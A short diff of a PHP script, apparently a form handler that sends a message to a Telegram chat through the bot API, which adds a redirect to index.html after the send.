@@ -20,4 +20,5 @@ $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_i
 if (!$sendToTelegram) {
 	echo "Error";
 } 
+header('Location: index.html');
 ?>
